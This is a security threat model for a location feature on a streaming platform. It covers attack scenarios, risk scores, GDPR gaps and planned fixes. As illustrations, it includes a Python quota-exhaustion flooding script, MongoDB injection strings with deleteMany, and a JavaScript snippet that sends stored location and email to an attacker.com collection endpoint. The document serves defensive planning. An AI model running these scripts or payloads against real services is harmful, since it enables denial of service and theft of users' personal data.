# Threat Model: Location-Aware Content Feature
## Bayit+ Platform Security Analysis

**Date:** January 27, 2026
**Version:** 1.0
**Threat Level:** MEDIUM-HIGH

---

## 1. ATTACK SURFACE ANALYSIS

### Entry Points

```
┌─────────────────────────────────────────────────────────────┐
│                    User Browser/Client                      │
├─────────────────────────────────────────────────────────────┤
│ 1. Browser Geolocation API (coordinates: lat/lng)           │
│ 2. useUserGeolocation Hook (client-side caching)            │
│ 3. localStorage (CACHE_KEY: 'bayit_user_location')          │
└─────────────────────────────────────────────────────────────┘
                          ↓↓↓
┌─────────────────────────────────────────────────────────────┐
│              Frontend (web/src/pages/HomePage.tsx)          │
├─────────────────────────────────────────────────────────────┤
│ 4. GET /api/v1/location/reverse-geocode [UNPROTECTED]       │
│ 5. GET /api/v1/content/israelis-in-city [OPTIONAL AUTH]     │
│ 6. PATCH /api/v1/users/me/preferences [AUTHENTICATED]       │
└─────────────────────────────────────────────────────────────┘
                          ↓↓↓
┌─────────────────────────────────────────────────────────────┐
│           Backend API (FastAPI Application)                 │
├─────────────────────────────────────────────────────────────┤
│ 7. LocationService.reverse_geocode() [UNVALIDATED COORDS]   │
│ 8. LocationContentService.get_israelis_in_city() [INJECTION]│
│ 9. GeoNames API Client [UNAUTHENTICATED]                    │
│ 10. MongoDB Aggregation Queries [STRING INTERPOLATION]      │
└─────────────────────────────────────────────────────────────┘
                          ↓↓↓
┌─────────────────────────────────────────────────────────────┐
│          External Services & Data Storage                   │
├─────────────────────────────────────────────────────────────┤
│ 11. GeoNames API (external, rate-limited)                   │
│ 12. MongoDB Atlas (location_cache collection)               │
│ 13. MongoDB Atlas (users.preferences.detected_location)     │
│ 14. Browser localStorage (location data, plaintext)         │
└─────────────────────────────────────────────────────────────┘
```

---

## 2. THREAT SCENARIOS

### Scenario 1: API Quota Exhaustion Attack (HIGH)

**Threat Actor:** External attacker or competitor
**Attack Vector:** Unauthenticated `/location/reverse-geocode` endpoint
**Attack Method:** Rapid requests with random coordinates

```bash
# Attacker script (Python)
import requests
import random
import time

def exhaust_quota():
    for i in range(100000):
        lat = random.uniform(-90, 90)
        lng = random.uniform(-180, 180)

        response = requests.get(
            f"https://api.bayit.tv/api/v1/location/reverse-geocode",
            params={"latitude": lat, "longitude": lng}
        )

        print(f"Request {i}: {response.status_code}")
        time.sleep(0.001)  # 1000 req/sec

exhaust_quota()
```

**Impact:**
- GeoNames API quota exhausted in minutes
- Location feature completely non-functional
- Legitimate users unable to use app
- Platform reputation damage
- Potential financial impact (premium API tier)

**Current Defenses:** NONE
**Required Defenses:** Rate limiting (30/min per IP)

---

### Scenario 2: MongoDB Injection Attack (HIGH)

**Threat Actor:** Malicious user or attacker
**Attack Vector:** City/state parameters in content queries
**Attack Method:** MongoDB operators in query strings

```typescript
// Malicious input
const city = 'New York) }; db.content.deleteMany({';
const state = 'NY';

// Resulting query (VULNERABLE):
// db.content.aggregate([
//   { $match: {
//       $and: [
//         { $or: [
//             { title: { $regex: "(?i)(New York) }; db.content.deleteMany({|NY|israeli)" } }
//           ]
//         }
//       ]
//     }
//   }
// ])
```

**Alternative Attack:**
```typescript
// Regex injection
const city = '.*';  // Matches any content
const state = 'NY';

// Returns all documents regardless of content
```

**Impact:**
- Unauthorized data access
- Data deletion or corruption
- Privilege escalation
- Complete database compromise

**Current Defenses:** NONE (basic string trimming only)
**Required Defenses:** Input sanitization, regex escaping, parameterized queries

---

### Scenario 3: Privacy Data Breach (MEDIUM)

**Threat Actor:** Attacker with database access
**Attack Vector:** MongoDB compromise or database dump
**Attack Method:** Stolen location history

```json
// Leaked user data
{
  "_id": "user_123",
  "email": "user@example.com",
  "preferences": {
    "detected_location": {
      "city": "New York",
      "state": "NY",
      "latitude": 40.7128,
      "longitude": -74.0060,
      "timestamp": "2026-01-27T12:00:00Z"
    }
  }
}
```

**Impact:**
- User home address inference
- Pattern analysis (frequent locations)
- Behavioral tracking
- Physical security risk
- GDPR violations

**Current Defenses:** NONE (plaintext storage)
**Required Defenses:** Encryption at rest, consent tracking, retention policies

---

### Scenario 4: Consent Violation & GDPR Non-Compliance (MEDIUM)

**Threat Actor:** Regulatory authority or privacy advocate
**Attack Vector:** Privacy policy mismatch, missing consent
**Attack Method:** Audit of location tracking practices

**Issues:**
1. User location stored without explicit consent record
2. No timestamp of consent
3. No mechanism to revoke consent
4. No audit trail
5. Missing retention policy

**Impact:**
- GDPR fines (€20M or 4% revenue)
- Privacy lawsuits
- User trust erosion
- Regulatory investigation
- App store removal potential

**Current Defenses:** NONE
**Required Defenses:** Consent tracking, audit logging, revocation mechanism

---

### Scenario 5: Cross-Site Scripting (XSS) - Client-Side Location Leakage (MEDIUM)

**Threat Actor:** Malicious third-party JavaScript
**Attack Vector:** localStorage exposure
**Attack Method:** Access to unencrypted location cache

```javascript
// Malicious code injected via compromised ad network or library
const storedLocation = localStorage.getItem('bayit_user_location');
const location = JSON.parse(storedLocation);

// Send to attacker server
fetch('https://attacker.com/collect', {
  method: 'POST',
  body: JSON.stringify({
    user_email: document.querySelector('[data-user-email]').textContent,
    location: location,
    timestamp: new Date().toISOString()
  })
});
```

**Impact:**
- Location data exfiltration
- User location tracking by third parties
- Privacy violation

**Current Defenses:** Content Security Policy (basic)
**Required Defenses:** Encryption at rest, localStorage hardening, CSP strengthening

---

### Scenario 6: Timezone-Based Location Inference (LOW-MEDIUM)

**Threat Actor:** Attacker with access to user session
**Attack Vector:** Fallback timezone location
**Attack Method:** Correlate timezone with identity

```typescript
// Attacker can infer location from timezone fallback
const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
// "America/New_York" reveals user is in New York area
```

**Impact:**
- Partial location inference
- User de-anonymization
- Behavioral analysis

**Current Defenses:** NONE
**Required Defenses:** Timezone obfuscation, user consent for timezone fallback

---

## 3. THREAT MATRIX

| Threat | Entry Point | Attack Vector | Impact | Likelihood | Priority |
|--------|------------|---------------|--------|------------|----------|
| Quota Exhaustion | Geolocation endpoint | Brute force | DDoS/Service Down | HIGH | CRITICAL |
| MongoDB Injection | City/state parameters | Malicious input | Data breach | MEDIUM | CRITICAL |
| Privacy Breach | Database access | Stolen data | GDPR violation | MEDIUM | CRITICAL |
| Consent Violation | Location tracking | No consent record | Regulatory fine | HIGH | HIGH |
| XSS Leakage | localStorage | Malicious script | Location theft | LOW-MEDIUM | MEDIUM |
| Timezone Inference | Fallback location | Session analysis | De-anonymization | LOW | LOW-MEDIUM |

---

## 4. DATA FLOW ANALYSIS

### Normal Flow
```
1. User gives browser geolocation permission
2. Browser sends coordinates (lat, lng) to app
3. Frontend caches coordinates locally
4. Frontend calls reverse-geocode API with coordinates
5. Backend queries GeoNames API
6. GeoNames returns city/state/county
7. Backend caches result in MongoDB
8. Frontend displays "Israelis in [City]"
9. Frontend saves location preference to backend
10. Backend stores location in user.preferences
```

### Attack Flow (MongoDB Injection)
```
User Input: city="NYC'); db.users.deleteMany({"
         ↓
Frontend: passes to /location/query?city=NYC'); db.users.deleteMany({"
         ↓
Backend: builds query with string interpolation
         ↓
MongoDB: interprets as injection attack
         ↓
Result: Unauthorized data access/deletion
```

### Attack Flow (Rate Limit Bypass)
```
Attacker scripts: 10,000 requests/second
              ↓
No rate limiting present
              ↓
GeoNames API receives 10,000 requests
              ↓
GeoNames quota exhausted in seconds
              ↓
All location features fail for all users
```

---

## 5. ASSET INVENTORY

### Critical Assets

| Asset | Value | Threat | Protection |
|-------|-------|--------|-----------|
| User Locations | HIGH | Privacy | Encryption, retention policy |
| GeoNames API Key | HIGH | Quota exhaustion | Rate limiting, auth |
| User Preferences | MEDIUM | Unauthorized access | Authentication |
| MongoDB Data | CRITICAL | Injection, deletion | Input sanitization |
| Consent Records | MEDIUM | GDPR violation | Audit logging, timestamps |

---

## 6. ATTACK TREES

### Attack Tree 1: Query All User Locations

```
Goal: Access all user location data
├─ Method 1: Direct database access
│  ├─ Compromise MongoDB credentials
│  ├─ Network infiltration
│  └─ Query users collection
│
├─ Method 2: API injection
│  ├─ Find injection vulnerability
│  ├─ Craft malicious query
│  ├─ Submit via city/state parameter
│  └─ MongoDB processes malicious query
│
└─ Method 3: Backup exfiltration
   ├─ Access database backups
   ├─ Extract unencrypted locations
   └─ Sell location data
```

### Attack Tree 2: Crash Location Service

```
Goal: Disable location feature for all users
├─ Method 1: API quota exhaustion
│  ├─ Identify rate limit (currently none)
│  ├─ Write automation script
│  ├─ Send 100k requests in 1 minute
│  ├─ GeoNames quota exceeded
│  └─ All location queries fail
│
├─ Method 2: MongoDB DoS
│  ├─ Send expensive aggregation queries
│  ├─ Exhaust MongoDB resources
│  └─ Database becomes unresponsive
│
└─ Method 3: GeoNames service attack
   ├─ Compromised credentials
   ├─ Malicious API key usage
   └─ Service revoked/blocked
```

---

## 7. RISK SCORING

### Scoring Methodology
- **Impact:** 1-10 (1=none, 10=critical)
- **Likelihood:** 1-10 (1=rare, 10=certain)
- **Effort:** 1-10 (1=trivial, 10=extensive)
- **Risk Score:** (Impact × Likelihood) / Effort

### Risk Assessment

| Threat | Impact | Likelihood | Effort | Score | Priority |
|--------|--------|-----------|--------|-------|----------|
| Rate limiting bypass | 8 | 9 | 1 | **72** | CRITICAL |
| MongoDB injection | 10 | 7 | 2 | **35** | CRITICAL |
| Privacy data breach | 9 | 6 | 4 | **13.5** | CRITICAL |
| GDPR non-compliance | 10 | 8 | 1 | **80** | CRITICAL |
| XSS location leak | 6 | 5 | 3 | **10** | MEDIUM |
| Timezone inference | 3 | 6 | 2 | **9** | LOW |

**Overall Risk Level: HIGH**

---

## 8. MITIGATION STRATEGIES

### Priority 1: Immediate (This Week)

1. **Add Rate Limiting**
   - Implement per-IP rate limiter
   - Set limit: 30 requests/min on geolocation endpoint
   - Block exceeding requests with 429 status

2. **Prevent MongoDB Injection**
   - Create input sanitizer (QuerySanitizer)
   - Validate city (alphanumeric + spaces)
   - Validate state (2-letter code only)
   - Escape regex special characters

3. **Add Authentication**
   - Require user auth for location content endpoint
   - Track authenticated requests

### Priority 2: This Month

4. **Implement Consent Tracking**
   - Add LocationConsentRecord model
   - Store consent timestamp, version, IP
   - Track consent withdrawal

5. **Add Encryption**
   - Encrypt location data at rest
   - Use Fernet cipher with key rotation

6. **Create Retention Policy**
   - Auto-delete locations after 90 days
   - Implement background cleanup job

### Priority 3: Next Quarter

7. **Audit Logging**
   - Log all location data access
   - Track consent/revocation events
   - Generate compliance reports

8. **User Controls**
   - Add UI for consent management
   - Implement revocation endpoint
   - Add "right to be forgotten" option

---

## 9. COMPLIANCE REQUIREMENTS

### GDPR (General Data Protection Regulation)

**Article 6: Lawfulness of Processing**
- ❌ CURRENT: No explicit user consent
- ✅ REQUIRED: Signed consent form or opt-in

**Article 17: Right to be Forgotten**
- ❌ CURRENT: No deletion mechanism
- ✅ REQUIRED: Delete endpoint + 30-day compliance

**Article 32: Security of Processing**
- ❌ CURRENT: Unencrypted location storage
- ✅ REQUIRED: Encryption at rest + access controls

**Article 33: Breach Notification**
- ❌ CURRENT: No breach monitoring
- ✅ REQUIRED: Incident detection + 72-hour notification

---

## 10. SECURITY REQUIREMENTS

### Functional Requirements
- [ ] Reverse geocoding must work with valid coordinates
- [ ] Location caching must work for 24 hours
- [ ] User consent must be trackable
- [ ] Location data must be deletable on demand

### Non-Functional Requirements
- [ ] Rate limiting: 30 req/min per IP
- [ ] Response time: <200ms average
- [ ] Availability: 99.9% uptime
- [ ] Data encryption: AES-256 at rest
- [ ] GDPR compliance: <30-day deletion

---

## 11. SECURITY CONTROLS MATRIX

| Control | Type | Priority | Status | Evidence |
|---------|------|----------|--------|----------|
| Rate limiting | Preventive | CRITICAL | ❌ MISSING | None |
| Input validation | Preventive | CRITICAL | ⚠️ PARTIAL | Basic trim |
| MongoDB injection prevention | Preventive | CRITICAL | ❌ MISSING | None |
| Authentication | Detective | HIGH | ⚠️ OPTIONAL | get_optional_user |
| Encryption at rest | Preventive | HIGH | ❌ MISSING | Plaintext storage |
| Consent tracking | Detective | CRITICAL | ❌ MISSING | No consent record |
| Audit logging | Detective | HIGH | ❌ MISSING | No audit trail |
| Access controls | Preventive | MEDIUM | ✅ PARTIAL | User auth on preferences |
| Error handling | Preventive | MEDIUM | ⚠️ PARTIAL | Generic errors |
| Security headers | Preventive | MEDIUM | ✅ PARTIAL | Helmet.js configured |

---

## 12. INCIDENT RESPONSE PLAN

### Detection
- Monitor rate limit exceeded events
- Alert on MongoDB injection patterns
- Track API error rate spikes

### Containment
- Block attacking IP addresses
- Disable location endpoint if compromised
- Revoke GeoNames API key if abused

### Investigation
- Query audit logs for suspicious access
- Review MongoDB query patterns
- Analyze user complaint reports

### Recovery
- Restore from clean backup
- Implement post-incident fixes
- Conduct user notification

---

## CONCLUSION

The location-aware feature presents **MEDIUM-HIGH security risk** due to:

1. **Unprotected external API calls** → DDoS vulnerability
2. **Injection-prone queries** → Data breach risk
3. **Missing consent tracking** → GDPR non-compliance
4. **Unencrypted location storage** → Privacy risk

**Recommendation:** Do not deploy to production until CRITICAL issues are resolved.

**Timeline:** 1-2 weeks for full remediation with proper testing.

